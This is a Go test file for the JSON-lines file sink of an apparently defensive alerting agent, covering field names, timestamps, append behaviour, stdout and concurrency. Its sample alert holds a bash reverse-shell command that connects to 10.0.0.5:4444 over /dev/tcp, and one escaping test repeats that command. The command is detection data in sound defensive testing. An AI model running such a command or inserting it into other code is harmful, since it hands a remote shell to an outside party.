package alerts

import (
	"bytes"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"
)

// The reverse-shell example from the README. Its cmdline is full of the
// characters encoding/json escapes by default, which is why the sink turns
// HTML escaping off.
var sample = Alert{
	Rule:     "suspicious_shell_spawn",
	Severity: "high",
	PID:      12031,
	PPID:     1248,
	Name:     "bash",
	Cmdline:  "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
	Host:     "myhost",
	Tags:     []string{"reverse-shell", "mitre:T1059"},
}

func readLines(t *testing.T, path string) []string {
	t.Helper()
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read alert log: %v", err)
	}
	if len(body) == 0 {
		return nil
	}
	if body[len(body)-1] != '\n' {
		t.Fatalf("alert log does not end with a newline: %q", body)
	}
	return strings.Split(strings.TrimSuffix(string(body), "\n"), "\n")
}

func decodeLine(t *testing.T, line string) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal([]byte(line), &m); err != nil {
		t.Fatalf("alert line is not JSON: %v (%q)", err, line)
	}
	return m
}

func TestFileSinkWritesOneJSONObjectPerLine(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	second := sample
	second.Rule, second.PID = "scheduled_task_recon", 12032
	if err := sink.Emit(sample); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if err := sink.Emit(second); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if err := sink.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	lines := readLines(t, path)
	if len(lines) != 2 {
		t.Fatalf("got %d lines, want 2: %q", len(lines), lines)
	}
	first := decodeLine(t, lines[0])
	if first["rule"] != "suspicious_shell_spawn" || first["pid"] != float64(12031) {
		t.Errorf("first line = %v", first)
	}
	if got := decodeLine(t, lines[1]); got["rule"] != "scheduled_task_recon" || got["pid"] != float64(12032) {
		t.Errorf("second line = %v", got)
	}
}

// The field names are the documented alert format; renaming one breaks every
// consumer of the log.
func TestFileSinkUsesTheDocumentedFieldNames(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	if err := sink.Emit(sample); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	sink.Close()

	got := decodeLine(t, readLines(t, path)[0])
	var keys []string
	for k := range got {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	want := "cmdline host name pid ppid rule severity tags ts"
	if strings.Join(keys, " ") != want {
		t.Errorf("fields = %q, want %q", strings.Join(keys, " "), want)
	}
	if got["cmdline"] != sample.Cmdline || got["host"] != "myhost" || got["ppid"] != float64(1248) {
		t.Errorf("values do not round-trip: %v", got)
	}
	tags, _ := got["tags"].([]any)
	if len(tags) != 2 || tags[0] != "reverse-shell" || tags[1] != "mitre:T1059" {
		t.Errorf("tags = %v", got["tags"])
	}
}

// Shell redirections must stay readable in the log: `>&` should never be
// written as `\u003e\u0026`.
func TestFileSinkKeepsShellCharactersLiteral(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	if err := sink.Emit(sample); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	sink.Close()

	line := readLines(t, path)[0]
	if !strings.Contains(line, `"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"`) {
		t.Errorf("cmdline was escaped: %s", line)
	}
	if strings.Contains(line, `\u00`) {
		t.Errorf("line contains unicode escapes: %s", line)
	}
}

func TestFileSinkFillsInTheTimestamp(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	before := time.Now().UTC().Truncate(time.Second)
	if err := sink.Emit(sample); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	stamped := sample
	stamped.Timestamp = "2026-05-17T07:42:11Z"
	if err := sink.Emit(stamped); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	sink.Close()

	lines := readLines(t, path)
	ts, _ := decodeLine(t, lines[0])["ts"].(string)
	got, err := time.Parse(time.RFC3339, ts)
	if err != nil {
		t.Fatalf("ts %q is not RFC 3339: %v", ts, err)
	}
	if got.Before(before) || got.After(time.Now().Add(time.Second)) {
		t.Errorf("ts = %s, want roughly now (%s)", ts, before)
	}
	if got.Location() != time.UTC {
		t.Errorf("ts = %s, want UTC", ts)
	}
	if ts2 := decodeLine(t, lines[1])["ts"]; ts2 != "2026-05-17T07:42:11Z" {
		t.Errorf("an explicit ts was overwritten: %v", ts2)
	}
}

func TestFileSinkOmitsEmptyHostAndTags(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	bare := sample
	bare.Host, bare.Tags = "", nil
	if err := sink.Emit(bare); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	sink.Close()

	got := decodeLine(t, readLines(t, path)[0])
	for _, k := range []string{"host", "tags"} {
		if _, present := got[k]; present {
			t.Errorf("empty %q should be omitted: %v", k, got)
		}
	}
	// Zero PIDs are still meaningful and must stay.
	if _, present := got["ppid"]; !present {
		t.Errorf("ppid should always be written: %v", got)
	}
}

// Restarting the agent must not wipe the alerts it already wrote.
func TestFileSinkAppendsToAnExistingLog(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	if err := os.WriteFile(path, []byte("{\"rule\":\"earlier\"}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	if err := sink.Emit(sample); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	sink.Close()

	lines := readLines(t, path)
	if len(lines) != 2 || lines[0] != `{"rule":"earlier"}` {
		t.Fatalf("existing content was not preserved: %q", lines)
	}
	if decodeLine(t, lines[1])["rule"] != sample.Rule {
		t.Errorf("new alert not appended: %q", lines[1])
	}
}

func TestFileSinkCreatesTheLogFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "alerts.jsonl")
	sink, err := NewFileSink(path)
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	sink.Close()
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("log file not created: %v", err)
	}
	if info.Size() != 0 {
		t.Errorf("fresh log should be empty, has %d bytes", info.Size())
	}
}

func TestFileSinkErrorsWhenTheLogCannotBeOpened(t *testing.T) {
	path := filepath.Join(t.TempDir(), "missing-dir", "alerts.jsonl")
	if _, err := NewFileSink(path); err == nil {
		t.Fatal("expected an error for a path in a directory that does not exist")
	}
}

// "-" means stdout, and closing the sink must not close the process's stdout.
func TestFileSinkDashWritesToStdout(t *testing.T) {
	capture, err := os.Create(filepath.Join(t.TempDir(), "stdout"))
	if err != nil {
		t.Fatal(err)
	}
	realStdout := os.Stdout
	os.Stdout = capture
	defer func() { os.Stdout = realStdout }()

	sink, err := NewFileSink("-")
	if err != nil {
		t.Fatalf("NewFileSink: %v", err)
	}
	if err := sink.Emit(sample); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if err := sink.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	// A closed *os.File fails every later write; stdout must still be usable.
	if _, err := capture.WriteString("still open\n"); err != nil {
		t.Fatalf("Close closed stdout: %v", err)
	}
	capture.Close()

	lines := readLines(t, capture.Name())
	if len(lines) != 2 || lines[1] != "still open" {
		t.Fatalf("unexpected stdout contents: %q", lines)
	}
	if decodeLine(t, lines[0])["rule"] != sample.Rule {
		t.Errorf("alert not written to stdout: %q", lines[0])
	}
}

type failingWriter struct{ err error }

func (w failingWriter) Write([]byte) (int, error) { return 0, w.err }
func (w failingWriter) Close() error              { return nil }

func TestFileSinkReportsWriteErrors(t *testing.T) {
	boom := errors.New("disk full")
	sink := &fileSink{w: failingWriter{err: boom}}
	if err := sink.Emit(sample); !errors.Is(err, boom) {
		t.Fatalf("Emit error = %v, want %v", err, boom)
	}
}

// Every alert must land as one intact line even when several goroutines emit
// at once. The sink is given a plain bytes.Buffer, which has no locking of its
// own, so this relies on the sink's mutex (and -race catches a missing one).
func TestFileSinkIsSafeForConcurrentEmit(t *testing.T) {
	var buf bytes.Buffer
	sink := &fileSink{w: nopCloser{&buf}}
	const writers, perWriter = 8, 50
	var wg sync.WaitGroup
	for w := 0; w < writers; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			for i := 0; i < perWriter; i++ {
				a := sample
				a.PID = w*perWriter + i
				if err := sink.Emit(a); err != nil {
					t.Errorf("Emit: %v", err)
				}
			}
		}(w)
	}
	wg.Wait()
	sink.Close()

	lines := strings.Split(strings.TrimSuffix(buf.String(), "\n"), "\n")
	if len(lines) != writers*perWriter {
		t.Fatalf("got %d lines, want %d", len(lines), writers*perWriter)
	}
	seen := make(map[int]bool, len(lines))
	for _, line := range lines {
		pid, ok := decodeLine(t, line)["pid"].(float64)
		if !ok || seen[int(pid)] {
			t.Fatalf("bad or duplicate pid in %q", line)
		}
		seen[int(pid)] = true
	}
}
